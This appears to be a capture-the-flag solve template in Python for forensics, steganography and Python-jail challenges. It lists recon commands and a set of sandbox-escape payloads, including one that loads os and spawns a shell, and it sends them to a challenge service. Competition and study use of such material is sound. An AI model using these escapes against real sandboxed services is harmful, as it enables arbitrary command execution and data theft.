#!/usr/bin/env ctf-python
"""Solve template: misc, for forensics, stego, and pyjails."""
# Recon ladder:
#   file handout/*
#   strings -n 8 handout/* | sort -u | head -50
#   binwalk -e handout/*          embedded archives
#   exiftool handout/*            metadata
#   zbarimg handout/*.png         QR codes
#   pycdc handout/*.pyc           Python 3.9 and newer bytecode

import pathlib
import sys

# Walk up for lib/ctf.py. Counting parent directories breaks when a level is added.
_here = pathlib.Path(__file__).resolve()
for _p in _here.parents:
    if (_p / "lib" / "ctf.py").is_file():
        sys.path.insert(0, str(_p / "lib"))
        break

import ctf  # noqa: E402

JAIL_PAYLOADS = [
    # Class walk to the builtins.
    "().__class__.__base__.__subclasses__()",
    # Import through the loader when `import` is banned.
    "[c for c in ().__class__.__base__.__subclasses__() "
    "if c.__name__=='BuiltinImporter'][0].load_module('os').system('sh')",
    # No parentheses: a decorator applies a callable without a call.
    "@exec\nclass X:\n  pass",
    # Format-string leak when the jail filters only attribute access.
    "'{0.__class__.__base__.__subclasses__}'.format(())",
    # Read the flag when only process spawning is banned.
    "open('/flag.txt').read()",
]


def try_jail():
    io = ctf.tube()
    for p in JAIL_PAYLOADS:
        io.sendline(p.encode())
        out = io.recv(timeout=3)
        print(f"--- {p[:60]}\n{out[:400]!r}")
        f = ctf.find_flag(out)
        if f:
            return ctf.win(out)
    io.interactive()
    return None


def main():
    try_jail()


if __name__ == "__main__":
    main()
